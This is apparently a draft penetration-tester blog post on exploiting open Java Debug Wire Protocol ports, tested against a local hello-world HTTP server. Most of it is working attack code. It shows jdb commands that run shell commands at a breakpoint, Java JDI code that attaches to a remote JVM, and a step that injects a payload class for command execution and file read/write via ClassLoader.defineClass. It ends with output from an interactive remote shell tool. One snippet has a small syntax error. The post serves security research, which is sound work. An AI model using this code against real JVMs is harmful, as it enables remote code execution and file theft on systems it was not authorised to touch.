+++
date = '2025-08-18T13:15:16-04:00'
title = 'A Complete Noobs Exploration of JDWP and JDI'
draft = true
+++

## Intro

Recently on a penetration test my team and I discovered several JDWP ports open. The Java Debug Wire Protocol (JDWP) is ["[...] used for communication between a debugger and the Java virtual machine (VM) which it debugs."](https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/jdwp-spec.html)

So tl;dr: You can connect to a remote or local JVM over various protocols, break/suspend threads, and run code in the context of the suspended thread(s).

Public tooling for JDWP exploitation:
* IOActive's [jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
* Metasploit's [java_jdwp_debugger.rb](https://github.com/rapid7/metasploit-framework/blob/7f833ceba5d6ad01272fbf6169fb24dcf0173c68/modules/exploits/multi/misc/java_jdwp_debugger.rb)

## Problem

Our exploitation of JDWP was ***severely limited*** due to traffic restrictions preventing us from uploading and executing our C2 tooling, with our only options being a DNS C2 channel or executing commands directly via JDWP.

As such, we were unable to get any callbacks to our testing host from the Metasploit module and since the IOActive script only blindly executes commands we were unable to perform any meaningful post-exploitation. While we did inevitably deploy our custom C2 agent successfully using DNS as a C2 channel, I wanted to spend more time understanding JDWP, the Java Debug Interface (JDI), and what I could do with pure Java.

Why not use Metasploit or IOActive's script? 
There's nothing ***wrong*** with those scripts at all, though I wanted to see what I could do to limit the amount of JDI calls to the remote VM and how much I could implement in pure Java that would not require dropping a payload to disk.

## Testing

To accomplish my goal I knew that I needed to:
1. Attach to a remote VM
2. Break on a commonly hit method
3. Wait for a thread to hit the breakpoint
4. Resume other threads and execute code in the suspended thread

My first step was to download and run a simple Java program I could use to test `jdb` and eventually iron out the steps I need to take to build a simple shell using the JDI.

I used the following simple "Hello World" HTTP Server as the target debugee application:
* [https://github.com/OpenShift-Z/hello-world-http-java](https://github.com/OpenShift-Z/hello-world-http-java)

The following code snippet shows the `main` function as well as the test request handler:
```java
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

public class HelloWorld {
    public static void main(String[] args) throws Exception {
        final int port = 8000;
        HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
        server.createContext("/", new MyHandler());
        server.setExecutor(null); // creates a default executor
        System.out.println("Serving on port 8000..\n");
        server.start();
    } 

    static class MyHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange t) throws IOException {
            // Logging IP address of request to stdout
            System.out.println("Request received from: " + t.getRemoteAddress().toString());

            // Displaying Hello message
            String hello = "Hello CBSA!!!!!!";
            String response = "<html><body><h1>" + hello + "</h1>\n";

            // Displaying the OS arch that this is running on
            response += "<h2>JVM Architecture: " + System.getProperty("os.arch") + "</h2>\n";
            
            response += "<h2>JVM Flavor: " + System.getProperty("java.vm.name") + " "  + System.getProperty("java.version") + "</h2>\n";
            response += "</ul></body></html>\n";

            // Sending response
            t.sendResponseHeaders(200, response.length());
            OutputStream os = t.getResponseBody();
            os.write(response.getBytes());
            os.close();
        }
    }
}
```

After compiling the application, I executed the JAR with debug options enabled:

```shell
mike@host:~/jdwp_stuff/hello-world-http-java$ java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1234 -jar ./src/HelloWorld.jar 
Listening for transport dt_socket at address: 1234
Serving on port 8000..
```

Once run, I used the Java Debugger `jdb` to attach to the remote VM and list the loaded classes to look for a breakpoint:

```shell
mike@host:~$ jdb -attach 127.0.0.1:1234
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
> classes
** classes list **
HelloWorld
HelloWorld$MyHandler
boolean[]
byte[]
char[]
com.sun.net.httpserver.Filter
com.sun.net.httpserver.HttpContext
com.sun.net.httpserver.HttpHandler
com.sun.net.httpserver.HttpServer
com.sun.net.httpserver.spi.HttpServerProvider
com.sun.net.httpserver.spi.HttpServerProvider$1
... snip ...
> methods HelloWorld$MyHandler
** methods list **
HelloWorld$MyHandler <init>()
HelloWorld$MyHandler handle(com.sun.net.httpserver.HttpExchange)
java.lang.Object registerNatives()
java.lang.Object <init>()
java.lang.Object getClass()
java.lang.Object hashCode()
java.lang.Object equals(java.lang.Object)
java.lang.Object clone()
java.lang.Object toString()
java.lang.Object notify()
java.lang.Object notifyAll()
java.lang.Object wait()
java.lang.Object wait(long)
java.lang.Object wait(long, int)
java.lang.Object finalize()
java.lang.Object <clinit>()
com.sun.net.httpserver.HttpHandler handle(com.sun.net.httpserver.HttpExchange)
```

I placed a breakpoint on the `handle` method and used cURL to trigger the HTTP handler. Once the breakpoint was hit, I issued the following command to use Java's `java.lang.Runtime` `exec()` method to execute a local command:

```shell
> stop in HelloWorld$MyHandler.handle
Set breakpoint HelloWorld$MyHandler.handle
> 
Breakpoint hit: "thread=HTTP-Dispatcher", HelloWorld$MyHandler.handle(), line=23 bci=0

HTTP-Dispatcher[1] print new java.lang.String(java.lang.Runtime.getRuntime().exec("id").getInputStream().readAllBytes())
 new java.lang.String(java.lang.Runtime.getRuntime().exec("id").getInputStream().readAllBytes()) = "uid=1000(mike) gid=1000(mike) groups=1000(mike),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),984(docker)
 ```

 Now I have:
 1. A breakpoint I can reliably trigger with a curl request
 2. A `jdb` command I can use to execute commands on the host

So I need to write code that will:
1. Connect to the remote VM
2. Break on the target method
3. Wait for the breakpoint to be hit
4. Execute code in the suspended thread
5. Return the result


 ## Solution

 It's important to note that all local data must be mirrored to the remote VM, and all remote data you want to retrieve should be mirrored into the local process when using JDI to invoke remote methods.

 My first and admittedly naive approach was to:
 1. Leverage JDI to connect to the remote VM
 2. Suspend all target threads (important mistake)
 3. Invoke `java.lang.Runtime.getRuntime().exec(String command)` with my target command
 4. Call the `Process.getInputStream().readAllBytes()` method
 5. Call the `String(byte[])` constructor
 6. Copy the resulting string from the target VM to my host and print the result

 This ended up being... way too many JDI calls which inevitably took forever (if they ever completed).

 I will spare you the details of my trial and error, but I found several key issues with this approach:
 * Repeated calls over JDWP were unstable and took several seconds for each command
 * Suspending all threads was a poor decision based on my lack of subject knowledge (read: skill issue), as this caused deadlock and ultimately disrupted the running application's availability

I kept beating my head against this problem until I realized, why go through the hassle of writing 319287391287 manual invocations and string/byte copies to and from the remote VM when I could just load a class that performs the tasks I need and greatly reduce the remote invocations? 

I will use the following simple example class which supports command execution, file upload, and file download. Further works can absolutely expand on this -- there's so much more possible.

Do note that all of the methods are static, as I do not necessarily need to retain any stateful information and did not create an instance of the class in the remote VM.

```Java
package org.example;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;

public class Vastatrix4 {
    public static String ExecuteCommand(String command) {
        try{
            Process process = new ProcessBuilder("/bin/bash", "-c", command)
                    .redirectErrorStream(true)
                    .start();

            InputStream stdout = process.getInputStream();
            return new String(stdout.readAllBytes());
        }
        catch (Exception ex){
            return ex.toString();
        }
    }

    public static byte[] ReadFile(String filename){
        try{
            File file = new File(filename);
            FileInputStream fis = new FileInputStream(file);
            byte[] data = fis.readAllBytes();
            return data;
        }
        catch (Exception ex){
            return ex.toString().getBytes();
        }
    }

    public static String WriteFile(String filename, byte[] data){
        File file = new File(filename);
        try (FileOutputStream fos = new FileOutputStream(file)) {
            fos.write(data);
            return filename;
        }
        catch (Exception ex){
            return ex.toString();
        }
    }

}
```

Compiling the class with `javac Vastatrix4.java` we are left with the compiled class file which we can then directly inject into the remote VM.

Firstly we connect to the remote VM:

```java
public boolean Connect(){
        List<AttachingConnector> connectors = Bootstrap.virtualMachineManager().attachingConnectors();
        for (AttachingConnector connector : connectors) {
            if (connector.name().equals("com.sun.jdi.SocketAttach")) {
                this.attachingConnector = connector;
                break;
            }
        }

        if (attachingConnector == null) {
            System.out.println("[-] No attaching connector found");
            return false;
        }
        Map<String, Connector.Argument> arguments;
        arguments = this.attachingConnector.defaultArguments();
        arguments.get("hostname").setValue(this.host);
        arguments.get("port").setValue(this.port);

        try {
            this.vm = this.attachingConnector.attach(arguments);
        } catch (IOException | IllegalConnectorArgumentsException e) {
            System.out.println("[-] Error attaching connector\n\t" + e.getMessage());
            return false;
        }
        System.out.println("[+] Successfully connected to remote JDI");
        return true;
    }
```

Once complete we can hunt for and break on a commonly used method. Some of the methods I've used with great success are:

```
java.lang.Thread.run 
java.lang.System.getProperty
sun.net.httpserver.FixedLengthOutputStream.close
```

The following code shows breaking on a remote method, given it's Class, method name, and method signature (which is defined [here](https://docs.oracle.com/javase/8/docs/jdk/api/jpda/jdi/com/sun/jdi/doc-files/signature.html))

```java
public boolean BreakOnMethod(String className, String methodName, String signature) throws Exception {
        if (this.vm == null) {
            System.out.println("[-] VM not initialized, cannot break on method!");
            return false;
        }

        List<ReferenceType> classes = this.vm.classesByName(className);
        if (classes.isEmpty()) {
            ClassPrepareRequest prepareRequest = this.vm.eventRequestManager().createClassPrepareRequest();
            prepareRequest.setSuspendPolicy(EventRequest.SUSPEND_EVENT_THREAD);
            prepareRequest.addClassFilter(className);
            prepareRequest.enable();

            EventSet eventSet;
            while (true) {
                eventSet = this.vm.eventQueue().remove();
                for (Event event : eventSet) {
                    if (event instanceof ClassPrepareEvent) {
                        ClassPrepareEvent cp = (ClassPrepareEvent) event;
                        if (cp.referenceType().name().equals(className)) {
                            classes = List.of(cp.referenceType());
                            eventSet.resume();
                            break;
                        }
                    }
                }
                if (!classes.isEmpty()) break;
            }

            prepareRequest.disable();
        }

        ReferenceType refType = classes.get(0);
        List<Method> methods = (signature != null)
                ? refType.methodsByName(methodName, signature)
                : refType.methodsByName(methodName);

        if (methods.isEmpty()) {
            throw new IllegalArgumentException("Method not found: " + methodName);
        }

        Method method = methods.get(0);
        List<Location> locs = method.allLineLocations();
        if (locs.isEmpty()) {
            throw new IllegalStateException("No executable locations in method: " + method.name());
        }
        Location loc = locs.get(0);

        BreakpointRequest bp = this.vm.eventRequestManager().createBreakpointRequest(loc);
        // warning!
        // Don't be dumb like me and suspend all threads!
        bp.setSuspendPolicy(EventRequest.SUSPEND_EVENT_THREAD);
        bp.enable();

        System.out.printf("[+] Breakpoint set at %s.%s%s%n", className, methodName,
                (signature != null ? signature : ""));

        while (true) {
            EventSet eventSet = this.vm.eventQueue().remove();
            for (Event event : eventSet) {
                if (event instanceof BreakpointEvent) {
                    BreakpointEvent be = (BreakpointEvent) event;
                    this.SuspendedThread = be.thread();
                    // for whatever reason the thread wasn't always suspended
                    // I should probably check the suspend count here before re-suspending
                    // *hand waving* this is a PoC
                    this.SuspendedThread.suspend();
                    
                    System.out.println("[+] Breakpoint hit by thread: " + this.SuspendedThread.name());
                    eventSet.resume();
                    return true;
                }
            }
            eventSet.resume();
        }
    }
```

After calling this method, we SHOULD have a reference to a remotely suspended thread.

Once we do, we need to use JDI to inject our class into the remote VM using the path to our compiled payload class:

```java
public boolean InjectClass(String filename, String className) {

        byte[] classBytes = null;
        try {
            classBytes = Files.readAllBytes(Paths.get(filename));
        } catch (IOException e) {
            System.out.println("[-] Error reading file\n\t" + e.getMessage());
            return false;
        }

        if (SuspendedThread == null || !SuspendedThread.isSuspended()) {
            System.out.println("[-] Target thread is null or not suspended!");
            throw new IllegalStateException("Thread is not suspended.");
        }

        // get ClassLoader.defineClass([BII) method
        ReferenceType classLoaderClass = vm.classesByName("java.lang.ClassLoader").get(0);
        Method defineClassMethod = classLoaderClass.methodsByName("defineClass", "([BII)Ljava/lang/Class;").get(0);

        // find a live ClassLoader instance
        ObjectReference classLoader = null;
        for (ReferenceType refType : vm.allClasses()) {
            try {
                ObjectReference candidate = refType.classLoader();
                if (candidate != null) {
                    classLoader = candidate;
                    break;
                }
            } catch (Exception ignored) {
            }
        }

        if (classLoader == null) {
            System.out.println("[-] No class loader found");
            return false;
        }

        // create remote byte[] of class contents
        ArrayType byteArrayType = (ArrayType) vm.classesByName("byte[]").get(0);
        ArrayReference remoteBytes = byteArrayType.newInstance(classBytes.length);

        List<Value> values = new ArrayList<>(classBytes.length);
        for (byte b : classBytes) {
            values.add(vm.mirrorOf(b));
        }
        try {
            remoteBytes.setValues(values);
        } catch (InvalidTypeException e) {
            throw new RuntimeException(e);
        } catch (ClassNotLoadedException e) {
            throw new RuntimeException(e);
        }

        try {
            classLoader.invokeMethod(
                    SuspendedThread,
                    defineClassMethod,
                    List.of(remoteBytes, vm.mirrorOf(0), vm.mirrorOf(classBytes.length)),
                    ObjectReference.INVOKE_SINGLE_THREADED
            );
        } catch (Exception ex) {
            System.out.println("[-] Error invoking classLoader.defineClass()\n\t" + ex.getMessage());
            return false;
        }

        // force load into the loaded class list
        // if we don't do this, we will be unable to reference the class we injected
        try {
            ClassType classClass = (ClassType) vm.classesByName("java.lang.Class").get(0);

            Method forName = classClass.methodsByName(
                    "forName",
                    "(Ljava/lang/String;ZLjava/lang/ClassLoader;)Ljava/lang/Class;"
            ).get(0);

            classClass.invokeMethod(
                    SuspendedThread,
                    forName,
                    List.of(
                            vm.mirrorOf(className),
                            vm.mirrorOf(true),
                            classLoader
                    ),
                    ObjectReference.INVOKE_SINGLE_THREADED
            );

            System.out.println("[+] Successfully forced class load via Class.forName(name, true, loader)");
        } catch (Exception e) {
            System.out.println("[-] Failed to force class load: " + e.getMessage());
            return false;
        }
        return true;
    }
```

You MUST use the FQN class name when injecting.

Finally, now that our class is injected into the remote VM and inserted into the loaded class list, we can invoke any static method in our class like so:

```java
    public String RunRemoteCommand(String cmd) {
        if (SuspendedThread == null || !SuspendedThread.isSuspended()) {
            throw new IllegalStateException("Suspended thread is null or not suspended");
        }

        List<ReferenceType> matches = vm.classesByName(this.className);
        if (matches.isEmpty()) {
            throw new IllegalStateException("Injected class " + this.className + " not found in remote VM");
        }

        ClassType injectedClass = (ClassType) matches.get(0);

        Method executeMethod = injectedClass.methodsByName(
                "ExecuteCommand",
                "(Ljava/lang/String;)Ljava/lang/String;"
        ).get(0);

        Value result = null;
        try {

            result = injectedClass.invokeMethod(
                    SuspendedThread,
                    executeMethod,
                    List.of(vm.mirrorOf(cmd)),
                    ObjectReference.INVOKE_SINGLE_THREADED
            );
        } catch (Exception e){
            System.stdout.println("[-] Something horrible has happened! Oh no!\n" + e)
            return null;
        }
        String res = ((StringReference) result).value();
        return res;
    }
```

Putting this all together in a red-eye late-night developed, somewhat janky tool:

```shell
mike@host:~/IdeaProjects/Beanhive$ java -jar ./target/Beanhive-1.0-SNAPSHOT.jar -h 127.0.0.1 -p 1234 -c target/classes/org/example/Vastatrix4.class -n org.example.Vastatrix4 -b sun.net.httpserver.FixedLengthOutputStream.close
[+] Successfully connected to remote JDI
[i] Attempting to break on sun.net.httpserver.FixedLengthOutputStream.close()V
[+] Breakpoint set at sun.net.httpserver.FixedLengthOutputStream.close()V
[+] Breakpoint hit by thread: HTTP-Dispatcher
[+] Breakpoint hit successfully on thread
[i] Attempting to inject class "org.example.Vastatrix4" into remote JVM
[+] Successfully forced class load via Class.forName(name, true, loader)
[+] Successfully injected class "org.example.Vastatrix4"
[127.0.0.1]>id
uid=1000(mike) gid=1000(mike) groups=1000(mike),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),984(docker)

[127.0.0.1]>ls -la /proc
total 4
dr-xr-xr-x 547 root                 root                               0 Aug 15 20:13 .
drwxr-xr-x  23 root                 root                            4096 May 29 10:38 ..
dr-xr-xr-x   9 root                 root                               0 Aug 15 20:13 1
dr-xr-xr-x   9 root                 root                               0 Aug 15 20:13 10
dr-xr-xr-x   9 root                 root                               0 Aug 15 20:13 100
dr-xr-xr-x   9 root                 root                               0 Aug 18 17:58 100060
dr-xr-xr-x   9 root                 root                               0 Aug 18 17:58 100096
dr-xr-xr-x   9 mike                 mike                               0 Aug 18 17:57 100103
dr-xr-xr-x   9 mike                 mike                               0 Aug 18 17:57 100120
dr-xr-xr-x   9 mike                 mike                               0 Aug 18 17:57 100169
dr-xr-xr-x   9 mike                 mike                               0 Aug 18 17:58 100223
dr-xr-xr-x   9 root                 root                               0 Aug 18 18:00 100555
dr-xr-xr-x   9 mike                 mike                               0 Aug 18 18:01 100947
dr-xr-xr-x   9 mike                 mike                               0 Aug 18 18:01 100948
dr-xr-xr-x   9 mike                 mike                               0 Aug 18 18:01 100953
dr-xr-xr-x   9 avahi                avahi                              0 Aug 15 20:13 1013
dr-xr-xr-x   9 messagebus           messagebus                         0 Aug 15 20:13 1014
dr-xr-xr-x   9 gnome-remote-desktop gnome-remote-desktop               0 Aug 15 20:13 1017
dr-xr-xr-x   9 root                 root                               0 Aug 15 20:13 102
dr-xr-xr-x   9 root                 root                               0 Aug 15 20:13 1020
dr-xr-xr-x   9 root                 root                               0 Aug 18 18:10 102030
dr-xr-xr-x   9 root                 root                               0 Aug 15 20:13 103
dr-xr-xr-x   9 polkitd              polkitd                            0 Aug 15 20:13 1030
dr-xr-xr-x   9 root                 root                               0 Aug 15 20:13 1032
```

The code can be viewed [here], 